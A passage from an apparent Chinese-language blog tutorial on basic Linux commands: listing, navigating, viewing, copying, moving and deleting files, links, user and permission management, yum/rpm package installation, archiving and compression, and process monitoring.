<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">ls --color=auto	<span class="comment">//开启颜色标注  红色-&gt;压缩文件   浅蓝色-&gt;链接文件  灰色-&gt;其他文件</span></span><br><span class="line">ls --color=none	<span class="comment">//关闭颜色标注</span></span><br><span class="line">ls -a	<span class="comment">//显示所有的文件和目录，包括隐藏的</span></span><br><span class="line">ls -l	<span class="comment">//列出一个显示文件和目录的详细信息的列表，每个文件和目录都有一行详细的信息</span></span><br><span class="line">ls -h	<span class="comment">//以K,M,G为单位的形式显示文件大小</span></span><br><span class="line">ls -t	<span class="comment">//按文件最近一次修改时间排序</span></span><br><span class="line">ls -i	<span class="comment">//显示文件的inode</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//ls的常用参数合并在一次使用，效果是叠加的</span></span><br><span class="line">ls -alth</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>cd</code>：切换目录</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">cd /	<span class="comment">//切换到根目录</span></span><br><span class="line">cd ~	<span class="comment">//切换到家目录</span></span><br><span class="line">cd		<span class="comment">//cd命令不加参数默切换到家目录</span></span><br><span class="line">cd ..	<span class="comment">//切换到上级目录</span></span><br><span class="line">cd ../..	<span class="comment">//切换到上上级目录</span></span><br><span class="line">cd /usr/bin	<span class="comment">//切换到usr-&gt;bin目录</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>tip：之前的Tab键也可以用到路径的补全上。</p>
</li>
<li><p><code>du</code>：英语disk usage的缩写，表示“磁盘使用/占用”，该命令可以让我们知道文件和目录所占的空间大小，相比<code>ls -l</code>命令，<code>du</code>命令统计的才是真正的文件大小。<code>du</code>命令会深入遍历每个目录的子目录，统计所有文件的大小</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">du	<span class="comment">//列出所有文件的大小并统计当前目录的总大小</span></span><br><span class="line">du -s	<span class="comment">//只看当前目录的总大小</span></span><br></pre></td></tr></table></figure>



</li>
</ul>
<h6 id="5、操纵文件"><a href="#5、操纵文件" class="headerlink" title="5、操纵文件"></a>5、操纵文件</h6><ul>
<li><p>显示文件内容</p>
<ul>
<li><p><code>cat</code>：一次性在终端汇总显示文件的所有内容，在命令后面加上文件路径即可</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">cat hello.txt</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>less</code>：和<code>cat</code>命令不同的是，<code>less</code>命令会分页的显示文件内容,分页内容的多少根据终端屏幕来界定 ，配合键盘空格、上下键、回车键进行阅读</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">less hello.txt</span><br></pre></td></tr></table></figure>

<p><code>d</code>键：前进半页</p>
<p><code>u</code>键：后退半页</p>
<p><code>b</code>键：后退一页，与PageUp(上一页)效果一样</p>
<p><code>space</code>空格键：前进整页</p>
<p><code>y</code>键：后退一行，与向上键效果一样</p>
<p><code>q</code>键：停止读取文件，终止<code>less</code>命令</p>
<p><code>=</code>号：显示你当前在文件处于的位置</p>
<p><code>h</code>键：显示帮助文档。<code>q</code>键退出帮助文档</p>
<p><code>/</code>：进入搜索模式，搜索完按<code>n</code>键到下一个搜索结果，<code>N</code>键到上一个搜索结果</p>
</li>
<li><p><code>more</code>：类似<code>less</code>分页显示内容，<code>more</code>没有<code>less</code>那么强大，比如不能往后翻页，只能往前</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">more hello.txt</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>head</code>：显示文件的开头几行，默认10行，如果要指定显示的行数，可以用<code>-n 行数</code>参数来指定几行</p>
</li>
<li><p><code>tail</code>：显示文件结尾的几行，用法和<code>head</code>类似，而且该命令配合<code>-f</code>参数可以实时追踪文件的更新，频率是1秒检查一次文件是否有新内容，如果要指定间隔检查的时间，用<code>-s</code>参数，<code>tail -f -s 4 filename</code>，使用<code>Ctrl + c</code>退出追踪状态</p>
</li>
</ul>
</li>
<li><p>创建文件</p>
<ul>
<li><p><code>touch</code>：创建空白文件</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">touch new_file	<span class="comment">//创建一个新文件</span></span><br><span class="line">touch new_file1 new_file2	<span class="comment">//同时创建多个新文件</span></span><br><span class="line">touch <span class="string">&#x27;filename with space&#x27;</span> <span class="comment">//如果创建的文件名有空格，使用双引号</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>创建目录</p>
<ul>
<li><p><code>mkdir</code>：创建一个目录 </p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">mkdir new_folder	<span class="comment">//创建目录new_folder</span></span><br><span class="line">mkdir -p one/two/three	<span class="comment">//使用-p参数来递归创建目录结构</span></span><br></pre></td></tr></table></figure>



</li>
</ul>
</li>
</ul>
<ul>
<li><p>复制文件或目录</p>
<ul>
<li><p><code>cp</code>命令</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">cp file file_copy	<span class="comment">//复制文件file为file_copy</span></span><br><span class="line">cp file ../file_copy	<span class="comment">//复制文件file到上一级目录中</span></span><br><span class="line">cp -r folder folder_copy	<span class="comment">//复制文件夹folder为folder_copy</span></span><br><span class="line">cp *.txt folder	把当前目录下所有的txt后缀的文件拷贝到folder目录中</span><br><span class="line">cp ha* folder	<span class="comment">//把当前目录以ha开头的文件都拷贝到folder目录中</span></span><br></pre></td></tr></table></figure>



</li>
</ul>
</li>
</ul>
<ul>
<li><p>移动文件</p>
<ul>
<li><p><code>mv</code>命令</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">mv file one/file	<span class="comment">//将当前文件下的file文件移动到one目录下</span></span><br><span class="line">mv file file_mv	<span class="comment">//将file文件改名为file_mv</span></span><br></pre></td></tr></table></figure>



</li>
</ul>
</li>
</ul>
<ul>
<li><p>删除文件和目录</p>
<ul>
<li><p><code>rm</code>命令</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">rm file1	<span class="comment">//删除文件file1</span></span><br><span class="line">rm file1 file2	<span class="comment">//同时删除文件file1和file2</span></span><br><span class="line">rm -i file	<span class="comment">//删除文件前向用户确认</span></span><br><span class="line">rm -r folder	<span class="comment">//删除folder目录</span></span><br><span class="line">rm -f file1	<span class="comment">//强制删除文件file1，不经过询问确认</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>查找文件</p>
<ul>
<li><p><code>locate</code>命令</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">locate &lt;filename&gt;	<span class="comment">//查找文件，如果是刚创建的就会搜索不到</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><code>find</code>命令</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">finde &lt;filename&gt;	<span class="comment">//查找文件，包括刚创建的文件</span></span><br><span class="line">find /<span class="keyword">var</span> -size +<span class="number">10</span>M <span class="comment">//查找/var中大小超过10M的文件</span></span><br><span class="line">find /<span class="keyword">var</span> -size <span class="number">-50</span>k <span class="comment">//查找/var中大小小于50k的文件</span></span><br><span class="line">find /<span class="keyword">var</span> -size <span class="number">10</span>k	<span class="comment">//查找/var中大小等于10k的文件</span></span><br><span class="line">find  -name <span class="string">&quot;*.txt&quot;</span> -atime <span class="number">-7</span>	<span class="comment">//根据文件的最近7天访问时间查找名字以.txt为后缀的文件</span></span><br><span class="line">find -type d -name <span class="string">&quot;test&quot;</span>	<span class="comment">//只查找查找名字包含test的目录</span></span><br><span class="line">find -type f -name <span class="string">&quot;test&quot;</span>	<span class="comment">//只查找名字包含test的文件，如果不是用-type参数指定类型，默认同时查找目录和文件</span></span><br><span class="line">find -name <span class="string">&quot;test&quot;</span> -<span class="keyword">delete</span>	<span class="comment">//找到文件后对文件进行删除操作</span></span><br><span class="line">find -name <span class="string">&quot;test&quot;</span> -exec chmod <span class="number">600</span> &#123;&#125; \; <span class="comment">//查找到文件并进行权限修改操作</span></span><br></pre></td></tr></table></figure>



</li>
</ul>
</li>
</ul>
<ul>
<li><p>创建链接</p>
<p>相关概念：</p>
<blockquote>
<p><strong>Linux下有两种链接类型</strong>：</p>
<ul>
<li>Physical link：物理链接或硬链接</li>
<li>Symbolic link：符号链接或软链接</li>
</ul>
<p><strong>文件的存储</strong>：</p>
<ul>
<li>每个文件有三部分：文件名、权限和文件内容</li>
<li>每个文件的文件内容被分配到一个表示号码，就是inode</li>
<li>每个文件名都绑定到它的文件内容（用inode标识）</li>
</ul>
<p><strong>硬链接原理</strong>：使链接的两个文件共享同样文件内容，就是同样的inode，一旦文件1和文件2之间有了硬链接，那么你修改文件1或文件2，修改的是相同的一块内容 ，只不过可以用两个文件名来取到文件内容</p>
<p><strong>硬链接缺陷</strong>：只能创建指向文件的硬链接，不能创建指向目录的，通过一些参数的修改，也可以指向目录的硬链接，但比较复杂，软链接可以指向文件或目录。对于目录，一般都是用软链接</p>
<p>对<strong>硬链接</strong>来说，删除任意一方的文件，共同指向的文件内容并不会从硬盘上被删除</p>
<p>对<strong>软链接</strong>来说，删除软链接文件后，原文件不会受到影响，如果删除原文件，对应的软链接就会变成“死链接”，因为其指向的文件不见了</p>
<p>软链接可以指向目录，硬链接不行</p>
</blockquote>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">ln file1 file2 <span class="comment">//创建一个文件file2，使其成为file1的硬链接</span></span><br><span class="line">ln -s file1 file2 <span class="comment">//为file1创建软链接file2</span></span><br></pre></td></tr></table></figure>



</li>
</ul>
<h6 id="6、用户权限相关"><a href="#6、用户权限相关" class="headerlink" title="6、用户权限相关"></a>6、用户权限相关</h6><ul>
<li><p>普通用户以root身份运行命令</p>
<ul>
<li><code>sodu &lt;command&gt;</code>   输入该命令后，需要输入密码才能使用root身份执行相关命令，临时成为root身份</li>
<li><code>sudo su</code> 一直成为root用户，也是需要输入密码，如果要退出root身份，使用回普通用户身份，可以使用<code>exit</code>命令</li>
<li><code>su</code>  使用root身份执行命令，也是需要输入密码，不过这时候输入的密码是root的密码，而不是普通用户的密码</li>
</ul>
</li>
<li><p>添加新用户</p>
<ul>
<li><code>useradd &lt;username&gt;</code></li>
</ul>
</li>
<li><p>修改密码</p>
<ul>
<li><code>passwd &lt;username&gt;</code></li>
</ul>
</li>
<li><p>删除用户</p>
<ul>
<li><code>userdel &lt;username&gt;</code></li>
<li><code>userdel -r/--remove &lt;username&gt;</code> 连同<code>/home/username</code>目录一起删掉</li>
</ul>
</li>
<li><p>新增群组</p>
<ul>
<li><code>groupadd &lt;groupname&gt;</code></li>
</ul>
</li>
<li><p>修改用户账户</p>
<ul>
<li><code>usermod -g &lt;groupname&gt; &lt;username&gt;</code>将用户放到某个群组里面，会将用户从原有群组移除，再添加到新的指定群组</li>
<li><code>usermod -G &lt;groupname1&gt;,&lt;groupname2&gt;</code>将用户同时放到多个群组里面，会将用户从原有群组移除，再添加到新的指定群组</li>
<li><code>usermod -ag &lt;groupname&gt;</code>将用户添加到groupname群组里面，同时保留其原在群组</li>
</ul>
</li>
<li><p>查看用户属于哪些群组</p>
<ul>
<li><code>groups &lt;usernmae&gt;</code></li>
</ul>
</li>
<li><p>删除群组</p>
<ul>
<li><code>groupdel &lt;groupname&gt;</code></li>
</ul>
</li>
<li><p>修改文件的所有者和群组</p>
<ul>
<li><code>chown &lt;username&gt; &lt;filename&gt;</code>改变文件的所有者</li>
<li><code>chown -R &lt;username&gt; &lt;foldername&gt;</code>改变目录所有者</li>
<li><code>chgrp &lt;groupname&gt; &lt;filename&gt;</code>改变文件所在的群组 </li>
<li><code>chown &lt;username&gt;:&lt;groupname&gt; &lt;filename&gt;</code>同时修改文件所有者和所在群组</li>
</ul>
</li>
<li><p>修改权限</p>
<ul>
<li><p><code>chmod 600 &lt;filename&gt;</code></p>
<table>
<thead>
<tr>
<th>权限</th>
<th>数字</th>
<th>计算</th>
</tr>
</thead>
<tbody><tr>
<td>—</td>
<td>0</td>
<td>0+0+0</td>
</tr>
<tr>
<td>r–</td>
<td>4</td>
<td>4+0+0</td>
</tr>
<tr>
<td>-w-</td>
<td>2</td>
<td>0+2+0</td>
</tr>
<tr>
<td>–x</td>
<td>1</td>
<td>0+0+1</td>
</tr>
<tr>
<td>rw-</td>
<td>6</td>
<td>4+2+0</td>
</tr>
<tr>
<td>-wx</td>
<td>3</td>
<td>0+2+1</td>
</tr>
<tr>
<td>r-x</td>
<td>5</td>
<td>4+0+1</td>
</tr>
<tr>
<td>wrx</td>
<td>7</td>
<td>4+2+1</td>
</tr>
</tbody></table>
</li>
</ul>
</li>
</ul>
<h6 id="7、软件安装"><a href="#7、软件安装" class="headerlink" title="7、软件安装"></a>7、软件安装</h6><p>  相关概念：</p>
<blockquote>
<p><strong>软件包 Package</strong>：软件的所有文件的压缩包，二进制形式的包含了安装软件的所有指令，在Red Hat一族里，软件包的后缀是<code>.rpm</code></p>
<p><strong>rpm</strong>：是Red Hat Package Manager的缩写，表示“红帽软件包管理器”</p>
<p>Centos作为<strong>Red Hat一族</strong>的一员，也是用<code>.rpm</code>的软件包</p>
<p><strong>Debian一族</strong>（Ubuntu，Debian等）的软件包是<code>.deb</code>为后缀</p>
<p>Linux的软件包都存放在一个地方，叫做<strong>软件仓库（repository）</strong></p>
<p>软件仓库不只是存放在一台服务器上，全球有很多个软件仓库（也就是有很多服务器）</p>
</blockquote>
<ul>
<li><p>更换软件仓库</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">修改/etc/yum.repos.d/CentOS-Base.repo文件更换仓库地址</span><br></pre></td></tr></table></figure>

<p>CentosOS官方的软件源列表：<a href="https://www.centos.org/download/mirrors">https://www.centos.org/download/mirrors</a></p>
</li>
<li><p>包管理</p>
<ul>
<li><code>yum</code><ul>
<li><code>yum update/upgrade</code>：更新软件包，如果后面不带具体的软件包名称，就会升级所有的软件包</li>
<li><code>yum search &lt;package-name&gt;</code>：搜索软件包</li>
<li><code>yum install &lt;package-name&gt;</code>：安装软件包</li>
<li><code>yum remove/autoremove &lt;package-name&gt;</code>：删除软件包</li>
<li><code>yum localinstall *.rpm</code>：安装本地的.rpm软件包</li>
<li><code>yum remove &lt;package-name&gt;</code>：卸载本地的.rpm软件包</li>
</ul>
</li>
<li><code>rpm</code><ul>
<li><code>sudo rpm -i *.rpm</code>：安装本地的.rpm软件包</li>
<li><code>sudo rpm -e &lt;package-name&gt;</code>：卸载本地的.rpm软件包</li>
</ul>
</li>
</ul>
</li>
</ul>
<h6 id="8、文件的解压和压缩"><a href="#8、文件的解压和压缩" class="headerlink" title="8、文件的解压和压缩"></a>8、文件的解压和压缩</h6><ul>
<li><p><code>tar</code>命令：归档</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">tar -cvf sorting.tar sorting/	<span class="comment">//创建一个tar归档 参数c-&gt;创建 v-&gt;显示操作的细节 f-&gt;归档文件</span></span><br><span class="line">tar -cvf file1 file2 file3</span><br><span class="line">tar -tf sorting.tar	<span class="comment">//显示归档的内容，但是不解开归档</span></span><br><span class="line">tar -rvf archive.tar file_extra.txt	<span class="comment">//追加文件到归档</span></span><br><span class="line">tar -xvf archive.tar	<span class="comment">//将生成的归档解开</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><code>gzip</code>命令：压缩</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">gzip archive.tar	<span class="comment">//压缩归档，生成文件archive.tar.gz</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><code>bzip2</code>命令：压缩</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">bzip2 archive.tar	<span class="comment">//压缩归档，生成文件archive.tar.bz2</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><code>gunzip</code>命令：解压缩</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">gunzip archive.tar.gz</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>bunzip2</code>命令：解压缩</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">bunzip2 archive.tar.bz2</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>-zcvf</code>参数：归档并压缩</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">tar -zcvf sorting.tar sorting/	<span class="comment">//归档并压缩</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><code>-zxvf</code>参数：解压并解开归档</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">tar -zxvf sorting.tar.gz	<span class="comment">//解压并解开归档</span></span><br><span class="line">tar -jxvf sorting.tar.bz2</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>zcat、zmore、zless</code>命令：查看gzip压缩文件内容</p>
</li>
<li><p><code>bzcat、bzmore、bzless</code>命令：查看bzip2压缩文件内容</p>
</li>
<li><p><code>zip</code>命令：压缩文件</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">zip -r sorting.zip sorting	<span class="comment">//压缩成sorting.zip文件 </span></span><br></pre></td></tr></table></figure>



</li>
</ul>
<ul>
<li><p><code>unzip</code>命令：解压zip文件</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">unzip archive.zip	<span class="comment">//解压.zip文件</span></span><br><span class="line">unzip -l archive.zip	<span class="comment">//不解开.zip文件，只看其中的内容</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//如果没有unzip命令 可以通过以下方式安装</span></span><br><span class="line">sudo yum install unzip</span><br></pre></td></tr></table></figure>



</li>
</ul>
<h6 id="9、进程和系统监测"><a href="#9、进程和系统监测" class="headerlink" title="9、进程和系统监测"></a>9、进程和系统监测</h6><ul>
<li><p><code>w</code>：帮助快速了解系统中目前有哪些用户登录着以及他们在干什么，还可以查看负载</p>
</li>
<li><p><code>tload</code>：查看负载曲线图</p>
</li>
<li><p><code>ps</code>命令：列出运行的进程列表，显示的进程列表不会随时间而更新，是静态的，类似进程的快照snapshot</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">ps -ef	<span class="comment">//列出所有用户在所有终端的所有进程</span></span><br><span class="line">ps -ef | less <span class="comment">//配合less查看</span></span><br><span class="line">ps -aux	<span class="comment">//通过CPU和内存使用来过滤进程</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><code>pstree</code>：以树形结构显示进程</p>
</li>
</ul>
<h6 id="10、操作进程和重启关闭系统"><a href="#10、操作进程和重启关闭系统" class="headerlink" title="10、操作进程和重启关闭系统"></a>10、操作进程和重启关闭系统</h6><ul>
<li><code>top</code>：进程的动态列表，使用<code>q</code>退出</li>
<li><code>kill</code>：结束一个进程</li>
<li><code>halt</code>：关闭系统</li>
<li><code>reboot</code>：重启系统</li>
</ul>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>系统</tag>
      </tags>
  </entry>
</search>
